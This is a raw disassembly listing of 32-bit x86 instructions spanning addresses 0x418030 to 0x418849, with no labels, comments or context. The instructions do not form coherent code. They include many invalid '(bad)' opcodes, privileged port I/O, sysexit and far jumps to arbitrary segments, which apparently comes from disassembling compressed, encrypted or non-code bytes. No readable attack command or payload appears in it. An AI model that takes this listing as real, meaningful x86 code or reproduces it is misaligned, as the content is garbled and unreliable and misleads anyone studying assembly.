  418030:	dec    edx
  418031:	lods   eax,DWORD PTR ds:[esi]
  418032:	and    BYTE PTR [edx+0x0],dh
  418035:	div    DWORD PTR [eax]
  418037:	pop    es
  418038:	mov    DWORD PTR [ebp-0x3e],eax
  41803b:	lds    eax,FWORD PTR [ecx-0x3a39f38]
  418041:	(bad)  
  418042:	(bad)  ds:0xdd8ed25
  418048:	and    eax,0x7111e50d
  41804d:	sbb    BYTE PTR [esi-0x7df28aa3],ch
  418053:	add    eax,0x711c6252
  418058:	and    ch,dh
  41805a:	popa   
  41805b:	fld    DWORD PTR [ecx+ebp*4+0x2587f9c5]
  418062:	add    dh,0x8d
  418065:	and    eax,0x9150c282
  41806a:	jmp    0x4180c8
  41806c:	add    ecx,ebp
  41806e:	call   0xdf0ea56f
  418073:	cld    
  418074:	and    al,0xcd
  418076:	(bad)  
  418077:	sysexit 
  418079:	and    ah,BYTE PTR ds:0xb67506
  41807f:	out    0xf,al
  418081:	cmp    DWORD PTR [edx-0x33],ebp
  418084:	mov    ch,0x28
  418086:	jmp    0xb7132f
  41808b:	aam    0x55
  41808d:	jge    0x4180b3
  41808f:	imul   edx,ebp,0x74
  418092:	dec    eax
  418093:	adc    BYTE PTR [edi-0x6947f0ec],dl
  418099:	adc    al,0x50
  41809b:	inc    esp
  41809c:	sub    ah,BYTE PTR [eax]
  41809e:	sbb    al,0x72
  4180a0:	sbb    ah,BYTE PTR [eax]
  4180a2:	sub    BYTE PTR [edi+eiz*1+0x10],dl
  4180a6:	(bad)  
  4180a7:	out    dx,al
  4180a8:	adc    DWORD PTR [esi],0x554ccb40
  4180ae:	and    al,0xa7
  4180b0:	dec    esp
  4180b1:	inc    edx
  4180b2:	cmp    BYTE PTR [eax-0x6e],al
  4180b5:	and    BYTE PTR [eax],ah
  4180b7:	cmp    BYTE PTR [edx-0x428476f4],bl
  4180bd:	dec    esi
  4180be:	call   0x4221e0
  4180c3:	mov    al,ds:0x7f15fdca
  4180c8:	mov    DWORD PTR [eax+0x0],0x1b866
  4180cf:	mov    ebp,DWORD PTR [ecx]
  4180d1:	adc    eax,DWORD PTR [ebx+0x20791f]
  4180d7:	add    bl,BYTE PTR [ecx-0x32aed7e0]
  4180dd:	xchg   DWORD PTR [edi+ebx*4+0x6d],eax
  4180e1:	dec    esp
  4180e2:	push   0x0
  4180e4:	pop    edi
  4180e5:	mov    ds:0x8a3f2474,al
  4180ea:	std    
  4180eb:	(bad)  
  4180ec:	rcr    BYTE PTR [ecx],1
  4180ee:	and    BYTE PTR [eax+edx*8],dh
  4180f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180f2:	call   0xfe519882
  4180f7:	xor    BYTE PTR [edi],0x39
  4180fa:	adc    DWORD PTR [eax],eax
  4180fc:	push   ds
  4180fd:	in     al,dx
  4180fe:	std    
  4180ff:	je     0x418160
  418101:	sbb    ebp,edi
  418103:	je     0x418167
  418105:	out    0xc0,al
  418107:	cld    
  418108:	scas   al,BYTE PTR es:[edi]
  418109:	faddp  st(0),st
  41810b:	cld    
  41810c:	xchg   esi,eax
  41810d:	out    0xc0,al
  41810f:	push   esp
  418110:	adc    eax,0xaf5dd3f1
  418115:	imul   edi,DWORD PTR [edi-0x3c],0x66
  418119:	add    al,0x1d
  41811b:	add    BYTE PTR [edi+0x6ffd28cb],dl
  418121:	fidiv  DWORD PTR [ebx]
  418123:	jae    0x41817b
  418125:	out    dx,eax
  418126:	mov    cl,0xf
  418128:	in     eax,0x6d
  41812a:	add    al,0xfd
  41812c:	push   edi
  41812d:	dec    edx
  41812e:	aad    0xe7
  418130:	das    
  418131:	pop    eax
  418132:	xor    edi,ebp
  418134:	das    
  418135:	add    al,0x11
  418137:	add    cl,ah
  418139:	push   esi
  41813a:	loopne 0x41818c
  41813c:	pop    ss
  41813d:	retf   
  41813e:	sub    al,0x89
  418140:	es fdivrp st(0),st
  418143:	push   ebp
  418144:	adc    eax,0x744cc5
  418149:	das    
  41814a:	mov    ebx,0x872223d3
  41814f:	mov    esp,0xc1ff4a23
  418154:	push   ebx
  418155:	bound  eax,QWORD PTR [edi+0x436e23bc]
  41815b:	add    BYTE PTR [eax],al
  41815d:	bound  edi,QWORD PTR [eax+0x3f]
  418160:	(bad)  
  418161:	out    dx,al
  418162:	push   edi
  418163:	jg     0x41815e
  418165:	data16 clc 
  418167:	sbb    eax,0x4da2b7f
  41816c:	je     0x4181d0
  41816e:	push   ebp
  41816f:	adc    eax,0xa70b49cf
  418174:	(bad)  
  418175:	fdiv   DWORD PTR [eax-0x31]
  418178:	xor    BYTE PTR [ebx],bl
  41817a:	pop    edx
  41817b:	jnp    0x418158
  41817d:	arpl   cx,bx
  41817f:	jmp    0x6ee5ebae
  418184:	push   edx
  418185:	cmp    bl,BYTE PTR [edi+0x45]
  418188:	add    al,0x62
  41818a:	fs into 
  41818c:	fist   WORD PTR [ebp+0xc]
  41818f:	cmp    al,0xcd
  418191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418192:	bound  esp,QWORD PTR [esi-0x51995a21]
  418198:	fbld   TBYTE PTR [ecx-0x681e4057]
  41819e:	mov    al,0xb8
  4181a0:	mov    ch,BYTE PTR [ecx]
  4181a2:	inc    ecx
  4181a3:	push   ss
  4181a4:	adc    BYTE PTR [edx-0x27],ah
  4181a7:	pusha  
  4181a8:	mov    edi,0xbf5ef541
  4181ad:	add    BYTE PTR [ecx-0x7e508eeb],al
  4181b3:	icebp  
  4181b4:	jo     0x418165
  4181b6:	adc    DWORD PTR [ecx],0x1581bf61
  4181bc:	add    DWORD PTR [edx+0x62],esp
  4181bf:	fldl2t 
  4181c1:	mov    BYTE PTR [esi],dh
  4181c3:	std    
  4181c4:	and    ecx,esi
  4181c6:	mov    ch,BYTE PTR [ebx-0xe7e3f9c]
  4181cc:	cmp    DWORD PTR [edi-0x2c0602da],eax
  4181d2:	or     eax,DWORD PTR [esi]
  4181d4:	adc    edi,DWORD PTR ds:0xff01fd26
  4181da:	test   DWORD PTR [edi-0x16],edx
  4181dd:	xor    al,0x11
  4181df:	mov    cl,0x66
  4181e1:	cmp    al,0x75
  4181e3:	retf   
  4181e4:	loop   0x4181d6
  4181e6:	lods   eax,DWORD PTR ds:[esi]
  4181e7:	inc    ecx
  4181e8:	fild   WORD PTR [edx]
  4181ea:	(bad)  
  4181eb:	fnstenv [esi]
  4181ed:	shr    eax,cl
  4181ef:	popf   
  4181f0:	int    0xc3
  4181f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181f3:	ret    
  4181f4:	(bad)  
  4181f5:	shl    BYTE PTR [esi-0x629dff58],1
  4181fb:	inc    ecx
  4181fc:	sahf   
  4181fd:	aam    0x61
  4181ff:	fld    DWORD PTR [edi+0x300f15c5]
  418205:	xor    BYTE PTR [ebp-0x7752f3e7],ch
  41820b:	or     bl,dh
  41820d:	mov    bh,0x30
  41820f:	pusha  
  418210:	inc    ebp
  418211:	or     eax,0x45642600
  418216:	add    eax,0xa68a722
  41821b:	pop    esi
  41821c:	fld    DWORD PTR [eax+0x51ac60c3]
  418222:	jb     0x4181c1
  418224:	inc    ecx
  418225:	jbe    0x41821b
  418227:	popa   
  418228:	fld    DWORD PTR [edi+0x531305a5]
  41822e:	fidiv  DWORD PTR [ebx]
  418230:	pop    edx
  418231:	shl    esi,0x15
  418234:	and    DWORD PTR [edx+0x70],edx
  418237:	mov    ds:0xa26424fa,al
  41823c:	cli    
  41823d:	inc    eax
  41823e:	cdq    
  41823f:	or     DWORD PTR [eax-0x4],ebx
  418242:	jmp    0x36434628
  418247:	fldenv [ebp+0x61913d24]
  41824d:	into   
  41824e:	shr    DWORD PTR [edx-0x1516ff15],0xa5
  418255:	and    al,0x1
  418257:	xchg   ebx,eax
  418258:	sub    BYTE PTR [esi-0x3962a157],al
  41825e:	pusha  
  41825f:	mov    ebp,0x9d7018fa
  418264:	cli    
  418265:	cmp    BYTE PTR [ebx],dl
  418267:	popa   
  418268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418269:	lea    ebp,ds:0x3510282
  41826f:	jp     0x418220
  418271:	push   ebx
  418272:	add    BYTE PTR [edx+0x60],bh
  418275:	enter  0xe8,0x27
  418279:	out    0x0,eax
  41827b:	add    BYTE PTR [ecx-0x26],ah
  41827e:	dec    ebx
  41827f:	mov    DWORD PTR [edi+0x78d2439],eax
  418285:	sub    BYTE PTR ss:[eax+0x11],dl
  418289:	out    dx,eax
  41828a:	push   edx
  41828b:	push   edi
  41828c:	jmp    0xe7:0x3fe8c860
  418293:	add    BYTE PTR [eax-0x6fe7df72],dl
  418299:	jle    0x4182bb
  41829b:	sbb    al,0x80
  41829d:	xchg   BYTE PTR [eax],ah
  41829f:	inc    eax
  4182a0:	fisttp DWORD PTR [esi*2+0x45632724]
  4182a7:	and    al,0x1f
  4182a9:	or     eax,0x5ebf2475
  4182ae:	inc    ebp
  4182af:	and    al,0xb7
  4182b1:	or     al,0x75
  4182b3:	and    al,0x7
  4182b5:	dec    ecx
  4182b6:	ret    
  4182b7:	push   edi
  4182b8:	int3   
  4182b9:	xchg   BYTE PTR [eax],ah
  4182bb:	push   eax
  4182bc:	out    0x28,al
  4182be:	push   esi
  4182bf:	push   DWORD PTR [edi]
  4182c1:	ss xor al,0x50
  4182c4:	adc    ebx,ebx
  4182c6:	push   esi
  4182c7:	call   0x3da98b
  4182cc:	inc    eax
  4182cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182ce:	jg     0x4182ab
  4182d0:	ss cmp eax,0xd2b3ce89
  4182d6:	cwde   
  4182d7:	add    DWORD PTR [ebx-0x2a],edi
  4182da:	(bad)  
  4182db:	call   0xfca65ee0
  4182e0:	inc    DWORD PTR [eax]
  4182e2:	sbb    DWORD PTR [eax],esp
  4182e4:	and    bl,dl
  4182e6:	ret    0x198
  4182e9:	jnp    0x4182c1
  4182eb:	dec    esp
  4182ec:	and    al,0x62
  4182ee:	and    al,0x18
  4182f0:	fwait
  4182f1:	cli    
  4182f2:	inc    ecx
  4182f3:	add    BYTE PTR [ecx-0x676894db],cl
  4182f9:	arpl   WORD PTR [edx+0x7b],ax
  4182fc:	shl    DWORD PTR [ebp-0x1ea72e14],0x7e
  418303:	in     eax,0xc1
  418305:	dec    esi
  418306:	inc    edx
  418307:	(bad)  [eax-0x7d73fc2]
  41830d:	jecxz  0x4182ad
  41830f:	nop
  418310:	add    BYTE PTR [edx+0x42],ah
  418313:	rcl    DWORD PTR [ebp-0x53],cl
  418316:	fwait
  418317:	mov    ecx,0x2ff9d917
  41831c:	jae    0x41838c
  41831e:	mov    ecx,0x35e23d0
  418323:	mov    edx,0xfc75f50f
  418328:	dec    esi
  418329:	cli    
  41832a:	dec    edi
  41832b:	xor    bh,ch
  41832d:	in     eax,0xb7
  41832f:	xor    al,0x83
  418331:	aam    0x6d
  418333:	pop    es
  418334:	xor    ah,BYTE PTR [edx-0x32010e17]
  41833a:	inc    edx
  41833b:	jle    0x418383
  41833d:	xor    bl,BYTE PTR [edx-0x74ff8bfe]
  418343:	pop    eax
  418344:	add    BYTE PTR [ecx+0x5c222aa4],cl
  41834a:	bound  eax,QWORD PTR [edx+0x7b]
  41834d:	into   
  41834e:	mov    edx,0x9dffda17
  418353:	mov    bh,0x41
  418355:	call   0x463db4
  41835a:	cli    
  41835b:	xchg   edx,eax
  41835c:	loop   0x41835d
  41835e:	test   DWORD PTR [ebx+0x2504819],ecx
  418364:	add    eax,0x90d963b0
  418369:	add    BYTE PTR [ebp+0x54],ch
  41836c:	jmp    0x6de8:0x2e5c64e7
  418373:	push   esp
  418374:	push   ss
  418375:	call   0x9df0e3df
  41837a:	dec    esp
  41837b:	push   ebx
  41837c:	cmc    
  41837d:	(bad)  
  41837e:	mov    ebx,0x1dcd81da
  418383:	fldl2t 
  418385:	jle    0x4183c1
  418387:	pop    esi
  418388:	arpl   WORD PTR [eax+0x1b2c605d],di
  41838e:	stc    
  41838f:	stos   BYTE PTR es:[edi],al
  418390:	jmp    0x42646e98
  418395:	sub    eax,0x1ee9d9ef
  41839a:	jmp    0x4183fb
  41839c:	arpl   WORD PTR [edi-0x3c15abfc],si
  4183a2:	xchg   edi,eax
  4183a3:	pusha  
  4183a4:	sbb    edi,DWORD PTR [eax+eax*1+0x5c]
  4183a8:	inc    ecx
  4183a9:	dec    esi
  4183aa:	scas   al,BYTE PTR es:[edi]
  4183ab:	in     eax,dx
  4183ac:	push   ebx
  4183ad:	outs   dx,DWORD PTR ds:[esi]
  4183ae:	inc    ecx
  4183af:	ficomp WORD PTR [eax]
  4183b1:	popf   
  4183b2:	or     ecx,edx
  4183b4:	pusha  
  4183b5:	mov    ah,0x3
  4183b7:	bound  esp,QWORD PTR [eax+0x34]
  4183ba:	sbb    esi,DWORD PTR [ecx-0x24fc1695]
  4183c0:	and    eax,DWORD PTR [edx]
  4183c2:	cmp    al,0x75
  4183c4:	push   esp
  4183c5:	jmp    0x4183e2
  4183c7:	inc    esi
  4183c8:	push   esp
  4183c9:	jecxz  0x4183fc
  4183cb:	mov    edx,0x62043aba
  4183d0:	pop    eax
  4183d1:	push   esp
  4183d2:	mov    esp,0xe826609d
  4183d7:	gs retf 
  4183d9:	inc    edi
  4183da:	sahf   
  4183db:	pop    eax
  4183dc:	pushw  ss
  4183de:	call   0xc142364c
  4183e3:	pop    eax
  4183e4:	paddb  mm5,QWORD PTR [esi-0x2db3309]
  4183eb:	ja     0x41841d
  4183ed:	and    DWORD PTR [edx-0x19b635a1],0x358e18db
  4183f7:	dec    edx
  4183f8:	mul    DWORD PTR [edx+0x72]
  4183fb:	bound  edx,QWORD PTR [esi+0x531e2110]
  418401:	in     al,0x7e
  418403:	dec    ecx
  418404:	push   esi
  418405:	cld    
  418406:	pop    esp
  418407:	sub    dh,bh
  418409:	and    al,0xb9
  41840b:	add    BYTE PTR [ebp+ebx*4-0x3eee02dc],ch
  418412:	add    BYTE PTR [edx+ebp*1-0x9],ah
  418416:	ins    BYTE PTR es:[edi],dx
  418417:	ret    
  418418:	std    
  418419:	mov    ds:0xd98c57e8,al
  41841e:	add    BYTE PTR [edx-0x66],ch
  418421:	in     eax,dx
  418422:	test   DWORD PTR [ecx],ebp
  418424:	mov    ch,0xe8
  418426:	push   0xa0d961e9
  41842b:	xchg   ebx,eax
  41842c:	xor    bl,BYTE PTR [esi+0x45]
  41842f:	(bad)
  418432:	sti    
  418433:	pushf  
  418434:	fst    QWORD PTR [ebp+0x53]
  418437:	cdq    
  418438:	xchg   ebx,eax
  418439:	sbb    al,ch
  41843b:	cmp    ecx,DWORD PTR [edi+0x33]
  41843e:	cld    
  41843f:	je     0x418406
  418441:	mov    ds:0x505e2287,eax
  418446:	psubsw mm4,QWORD PTR [ecx+0x54]
  41844a:	jne    0x418459
  41844c:	push   esi
  41844d:	or     al,bl
  41844f:	cmp    ah,BYTE PTR ds:0x61e9d164
  418455:	fld1   
  418457:	or     DWORD PTR [ecx-0x27],ecx
  41845a:	add    BYTE PTR [eax],al
  41845c:	push   0xfb8f872c
  418461:	(bad)  
  418462:	add    BYTE PTR [eax],al
  418464:	mov    ds:0x8b00f3ed,eax
  418469:	aad    0xb5
  41846b:	pop    eax
  41846c:	jp     0x418444
  41846e:	add    BYTE PTR [ebx+0x1ceeb400],cl
  418474:	cmp    esp,esi
  418476:	or     BYTE PTR [edx-0x6b26b602],al
  41847c:	sar    BYTE PTR [edi],0xdc
  41847f:	pop    ebp
  418480:	pop    esi
  418481:	adc    ah,0xdf
  418484:	pop    ebp
  418485:	or     edx,ebp
  418487:	add    BYTE PTR [ebx-0x40],dl
  41848a:	and    ah,BYTE PTR [eax]
  41848c:	sbb    ah,ch
  41848e:	dec    esp
  41848f:	mov    esp,0x7508eb50
  418494:	and    al,0x13
  418496:	into   
  418497:	add    DWORD PTR [edx+0xa],ebp
  41849a:	out    dx,al
  41849b:	aas    
  41849c:	(bad)  
  41849e:	aad    0x89
  4184a0:	clc    
  4184a1:	jle    0x4184ac
  4184a3:	jo     0x4184ac
  4184a5:	stc    
  4184a6:	xchg   ebp,eax
  4184a7:	jecxz  0x41842c
  4184a9:	or     edx,esi
  4184ab:	add    BYTE PTR [ebp+0x44],dl
  4184ae:	shl    DWORD PTR [ecx+eax*1-0x5],1
  4184b2:	aad    0x89
  4184b4:	iret   
  4184b5:	arpl   dx,di
  4184b7:	jbe    0x4184b9
  4184b9:	retf   
  4184ba:	aam    0xe8
  4184bc:	test   DWORD PTR [esi-0x75],esi
  4184bf:	or     DWORD PTR [ebx+0x38ccee74],ecx
  4184c5:	mov    ah,0x1
  4184c7:	das    
  4184c8:	shl    BYTE PTR [eax+0x7d],0x56
  4184cc:	mov    ecx,DWORD PTR [edi]
  4184ce:	inc    ecx
  4184cf:	sbb    al,0x85
  4184d1:	lea    edx,[eax+0x6200832c]
  4184d7:	imul   ecx,ebp,0xfffffffe
  4184da:	xchg   ebp,eax
  4184db:	aas    
  4184dc:	add    BYTE PTR [ebp+eax*2-0xe],dh
  4184e0:	sub    esi,DWORD PTR [esi+edi*1-0x20]
  4184e4:	or     DWORD PTR [ebp+0x4122],0x207198a
  4184ee:	(bad)  
  4184ef:	lds    eax,FWORD PTR [ebx+esi*2+0x51]
  4184f3:	(bad)  
  4184f4:	cmp    ebp,eax
  4184f6:	stc    
  4184f7:	sub    ch,BYTE PTR [ebx]
  4184f9:	std    
  4184fa:	enter  0x2b3a,0x13
  4184fe:	call   0x1741:0xf5ffc034
  418505:	daa    
  418506:	arpl   WORD PTR [edi],cx
  418508:	aad    0xfe
  41850a:	xor    eax,0x92857743
  41850f:	inc    ecx
  418510:	add    BYTE PTR [eax],al
  418512:	imul   esi,DWORD PTR [ebp+0xc],0x6172
  418519:	(bad)  
  41851a:	call   0xe405286
  41851f:	inc    ebx
  418520:	ja     0x4184ef
  418522:	cli    
  418523:	and    al,ch
  418525:	cld    
  418526:	std    
  418527:	ret    
  418528:	sub    al,BYTE PTR [edx]
  41852a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41852c:	inc    esp
  41852d:	add    al,0x60
  41852f:	sbb    cl,dl
  418531:	pop    esp
  418532:	mov    DWORD PTR [ecx+ebx*1],eax
  418535:	add    cl,ch
  418537:	jle    0x41851d
  418539:	adc    eax,DWORD PTR [eax]
  41853b:	xor    DWORD PTR [ebp-0x46eab2a],eax
  418541:	iret   
  418542:	push   eax
  418543:	(bad)
  418546:	pop    ds
  418547:	jmp    0x4aa7:0xbdfe9a2a
  41854e:	add    BYTE PTR [edx-0x27],ah
  418551:	outs   dx,BYTE PTR ds:[esi]
  418552:	sub    esp,ecx
  418554:	push   eax
  418555:	push   ebp
  418556:	pop    es
  418557:	push   eax
  418558:	sbb    ecx,eax
  41855a:	push   ss
  41855b:	xchg   ebp,eax
  41855c:	push   eax
  41855d:	jmp    0x6203:0xea29d780
  418564:	fs stos DWORD PTR es:[edi],eax
  418566:	cs mov ah,0x75
  418569:	jmp    0x6da9:0xf9416203
  418570:	push   eax
  418571:	outs   dx,DWORD PTR ds:[esi]
  418572:	sbb    esp,ecx
  418574:	ds adc eax,0x821feafd
  41857a:	or     al,0x9a
  41857c:	push   eax
  41857d:	mov    ebx,DWORD PTR [edx]
  41857f:	aaa    
  418580:	adc    ah,BYTE PTR [ebx+edi*2+0x62]
  418584:	fldl2t 
  418586:	mov    bh,0x64
  418588:	pop    esi
  418589:	sub    al,0xb4
  41858b:	fcom   QWORD PTR [ebp+eax*8+0x6ed73b0b]
  418592:	inc    edx
  418593:	(bad)  [ebp+eax*1+0x2564b20c]
  41859a:	sbb    eax,ecx
  41859c:	mov    dl,0xe9
  41859e:	add    eax,DWORD PTR [eax]
  4185a0:	out    0x18,al
  4185a2:	mov    ebp,0x728ee2e6
  4185a7:	add    esp,DWORD PTR [edx-0x27]
  4185aa:	out    0xb8,eax
  4185ac:	sub    ah,BYTE PTR [esi+edx*4-0x19]
  4185b0:	push   ebp
  4185b1:	fs scas al,BYTE PTR es:[edi]
  4185b3:	out    0x49,eax
  4185b5:	fs lock jl 0x418623
  4185b9:	fs scas al,BYTE PTR es:[edi]
  4185bb:	out    0x75,eax
  4185bd:	mov    al,fs:0x6ee0e507
  4185c3:	mov    DWORD PTR [ecx-0x42fcdc0b],0xe0440142
  4185cd:	mov    cs,WORD PTR [ecx-0x1269e17]
  4185d3:	pop    ebx
  4185d4:	push   esp
  4185d5:	bound  edx,QWORD PTR [ebp+0x5]
  4185d8:	outs   dx,BYTE PTR ds:[esi]
  4185d9:	bound  eax,QWORD PTR [ebp+0xd]
  4185dc:	jb     0x418640
  4185de:	pop    es
  4185df:	pusha  
  4185e0:	mov    fs,WORD PTR [eax+0x45]
  4185e3:	or     eax,0xe547607e
  4185e8:	clc    
  4185e9:	loopne 0x418572
  4185eb:	sub    eax,0xe9c2fb8a
  4185f0:	pusha  
  4185f1:	inc    edx
  4185f2:	or     BYTE PTR [esp+eiz*4-0x41],dh
  4185f6:	mov    DWORD PTR [edi],edi
  4185f8:	or     dh,BYTE PTR [edi]
  4185fa:	mov    ds:0x87d963f3,eax
  4185ff:	pushf  
  418600:	outs   dx,BYTE PTR ds:[esi]
  418601:	test   BYTE PTR [esi-0x17],bl
  418604:	add    BYTE PTR [ecx+0x5a],ah
  418607:	shl    ebp,0x10
  41860a:	stos   BYTE PTR es:[edi],al
  41860b:	push   eax
  41860c:	bound  ecx,QWORD PTR [ebp+0x6481cb60]
  418612:	mov    cl,0x1
  418614:	jmp    0xfd661bc1
  418619:	in     al,0x19
  41861b:	jbe    0x418603
  41861d:	inc    esi
  41861e:	xchg   DWORD PTR [ebp-0x78269e17],esp
  418624:	ss data16 jge 0x4186a2
  418628:	jmp    0x6281c68e
  41862d:	push   ds
  41862e:	fist   DWORD PTR [ecx-0x68]
  418631:	ins    BYTE PTR es:[edi],dx
  418632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418633:	and    al,0xd5
  418635:	push   0x79cd2495
  41863a:	mov    ebx,gs
  41863c:	push   ss
  41863d:	xchg   DWORD PTR [eax+0x45],esp
  418640:	lds    ebx,FWORD PTR [ebp+0x6]
  418643:	pop    ecx
  418644:	add    bl,dl
  418646:	xchg   DWORD PTR [edi],eax
  418648:	push   ecx
  418649:	xor    BYTE PTR ds:0xdacb30e9,cl
  41864f:	add    BYTE PTR [ecx+0x19e926de],cl
  418655:	xor    dl,BYTE PTR [edi]
  418657:	push   eax
  418658:	mov    bl,0x88
  41865a:	icebp  
  41865b:	adc    al,0x39
  41865d:	dec    esi
  41865e:	lea    esi,[ebp+0xd]
  418661:	pushf  
  418662:	les    esp,FWORD PTR [eax+eax*1-0x30762585]
  418669:	add    BYTE PTR [ebx-0x74ff8c8d],dl
  41866f:	leave  
  418670:	dec    BYTE PTR [edx+0x3724f2cc]
  418676:	mov    esp,0x9cc386fd
  41867b:	pop    ds
  41867c:	push   edi
  41867d:	pop    ebx
  41867e:	or     esi,esp
  418680:	add    BYTE PTR [ebp-0x40],dl
  418683:	out    dx,al
  418684:	dec    ebx
  418685:	push   ecx
  418686:	push   0xc856d3d0
  41868b:	add    DWORD PTR [eax],0x3915400
  418691:	jmp    FWORD PTR [eax]
  418693:	(bad)  
  418694:	std    
  418695:	adc    eax,0x40e7e3
  41869a:	nop
  41869b:	xchg   ecx,eax
  41869c:	or     al,ch
  41869e:	lods   al,BYTE PTR ds:[esi]
  41869f:	data16 cld 
  4186a1:	inc    DWORD PTR [eax-0xb14fb7f]
  4186a7:	shl    BYTE PTR [edi-0x8],1
  4186aa:	xchg   ch,bh
  4186ac:	je     0x4186d3
  4186ae:	jle    0x4186c7
  4186b0:	clc    
  4186b1:	push   eax
  4186b2:	mov    ss,WORD PTR [edi]
  4186b4:	hlt    
  4186b5:	push   eax
  4186b6:	shl    esi,1
  4186b8:	push   ebp
  4186b9:	mov    DWORD PTR [esi],0x620004fe
  4186bf:	inc    eax
  4186c0:	add    ch,bh
  4186c2:	ja     0x418664
  4186c4:	adc    al,BYTE PTR [eax+0x62]
  4186c7:	outs   dx,DWORD PTR ds:[esi]
  4186c8:	jns    0x4186ba
  4186ca:	mov    ebp,0x136424
  4186cf:	and    al,BYTE PTR [eax-0x7d]
  4186d2:	div    BYTE PTR [edi]
  4186d4:	in     al,0x78
  4186d6:	dec    ecx
  4186d7:	jp     0x418701
  4186d9:	aas    
  4186da:	xchg   esp,eax
  4186db:	arpl   WORD PTR [eax+0x7b],ax
  4186de:	dec    ecx
  4186df:	jp     0x4186f9
  4186e1:	addr16 xchg esp,eax
  4186e3:	arpl   WORD PTR [eax+0x7b],ax
  4186e6:	leave  
  4186e7:	jp     0x4186b7
  4186e9:	nop
  4186ea:	(bad)  
  4186eb:	jge    0x4186db
  4186ed:	(bad)  
  4186ee:	mov    BYTE PTR [ecx+0x66c23dea],ah
  4186f4:	inc    eax
  4186f5:	sub    esp,0x56
  4186f8:	adc    edx,edx
  4186fa:	push   ebp
  4186fb:	jmp    0x9b7967e6
  418700:	out    dx,al
  418701:	loopne 0x41873e
  418703:	mov    ch,0xb7
  418705:	sbb    eax,0x7581ee0d
  41870a:	add    ch,BYTE PTR [ebp+0x4]
  41870d:	inc    ebp
  41870e:	push   0x61
  418710:	mov    esi,0xf55d5a3d
  418715:	inc    edx
  418716:	or     eax,0xd8f402ec
  41871b:	jmp    0x7c97:0xe810dc7e
  418722:	pop    esp
  418723:	inc    esi
  418724:	push   eax
  418725:	jge    0x41876b
  418727:	cmp    al,BYTE PTR ds:[ecx+0x8bc6dc0]
  41872e:	push   ebp
  418730:	inc    edx
  418731:	jnp    0x4187af
  418733:	add    BYTE PTR [esi-0x26],al
  418736:	jp     0x418784
  418738:	ds fxam 
  41873b:	jle    0x4186f0
  41873d:	bound  esi,QWORD PTR [esi+0x286071df]
  418743:	fbld   TBYTE PTR [edx+0x51bbabc5]
  418749:	xchg   ebx,eax
  41874a:	mov    cl,0xb0
  41874c:	dec    esp
  41874d:	pop    esi
  41874e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41874f:	fistp  QWORD PTR [ebp-0x57]
  418752:	rol    BYTE PTR fs:[ecx+0x1e789999],0xf5
  41875a:	sub    esp,edx
  41875c:	ss stos BYTE PTR es:[edi],al
  41875e:	outs   dx,BYTE PTR ds:[esi]
  41875f:	cmp    BYTE PTR [edx-0x70d52ad3],cl
  418765:	pusha  
  418766:	push   esi
  418767:	loopne 0x4187b2
  418769:	pop    edi
  41876a:	mov    dl,0xeb
  41876c:	sbb    ebp,esi
  41876e:	adc    DWORD PTR [eax-0x1fe19fe0],esi
  418774:	cmp    DWORD PTR [edi+0x3e],ebx
  418777:	loopne 0x4187cc
  418779:	bound  ebx,QWORD PTR [esi]
  41877b:	loopne 0x41871a
  41877d:	push   esi
  41877e:	mov    eax,0x2e608caf
  418783:	loopne 0x41871a
  418785:	bound  ebp,QWORD PTR [eax]
  418787:	adc    ch,bl
  418789:	(bad)  
  41878a:	loope  0x418808
  41878c:	mov    al,0xed
  41878e:	mov    ds,ebp
  418790:	call   0x9e1d5529
  418795:	mov    ds:0x8100af6a,eax
  41879a:	cdq    
  41879b:	mov    edx,0x521dead4
  4187a0:	xor    eax,0x1e534c16
  4187a5:	pop    edi
  4187a6:	dec    esp
  4187a7:	(bad)  
  4187a8:	fild   WORD PTR [ebp-0x58]
  4187ab:	xchg   esi,eax
  4187ac:	shr    BYTE PTR [eax+eiz*2+0x507f1b2d],cl
  4187b3:	add    DWORD PTR [esi],esi
  4187b5:	cmp    BYTE PTR [edi-0x37],bl
  4187b8:	arpl   bp,cx
  4187ba:	test   DWORD PTR [esi],0x14f7ad72
  4187c0:	gs xchg esi,eax
  4187c2:	lds    esp,FWORD PTR [ecx+0x62]
  4187c5:	or     eax,0xb4a118f8
  4187ca:	sbb    esi,DWORD PTR [esi-0x14]
  4187cd:	loope  0x418812
  4187cf:	push   DWORD PTR [esp+ecx*4-0x35]
  4187d3:	stc    
  4187d4:	call   0x197959d6
  4187d9:	repnz (bad) 
  4187db:	and    al,0x67
  4187de:	lds    ebx,FWORD PTR [ecx]
  4187e0:	fist   WORD PTR [ebp-0x22]
  4187e3:	mov    dl,0xbc
  4187e5:	push   cs
  4187e6:	mov    ebp,0xa508fb24
  4187eb:	and    al,0xdd
  4187ed:	mov    fs,WORD PTR [edi+0x5f7ae124]
  4187f3:	dec    ebp
  4187f4:	mov    dh,0x3b
  4187f6:	dec    esi
  4187f7:	call   0x24f0fe0d
  4187fc:	cli    
  4187fd:	add    BYTE PTR [esp+ebp*8],cl
  418800:	dec    edi
  418801:	cmp    dh,BYTE PTR [ebx]
  418803:	rol    DWORD PTR [ecx],0x62
  418806:	xchg   ebp,eax
  418807:	inc    ecx
  418808:	jmp    0x881ae6bf
  41880d:	mov    cl,0xbd
  41880f:	adc    dh,BYTE PTR [ebp-0x12]
  418812:	mov    dh,0x95
  418814:	and    al,0x2d
  418816:	test   eax,0x61e878ca
  41881b:	fld1   
  41881d:	imul   ecx,DWORD PTR ds:0xa71afc4e,0xffffff98
  418824:	out    0x5,eax
  418826:	(bad)  
  418827:	xchg   ebp,eax
  418828:	and    al,0x5
  41882a:	not    DWORD PTR [edi-0x1840ffcc]
  418830:	cmp    DWORD PTR [ebp+0x63],eax
  418833:	mov    DWORD PTR [eax],ecx
  418835:	jmp    FWORD PTR [edi-0x37acbfd6]
  41883b:	add    DWORD PTR [ebp+0x24],esi
  41883e:	ret    
  41883f:	in     eax,dx
  418840:	pop    es
  418841:	push   esi
  418842:	je     0x4187cd
  418844:	and    BYTE PTR [esp+esi*2],bh
  418847:	mov    DWORD PTR [eax],esp
  418849:	cmp    al,0x54
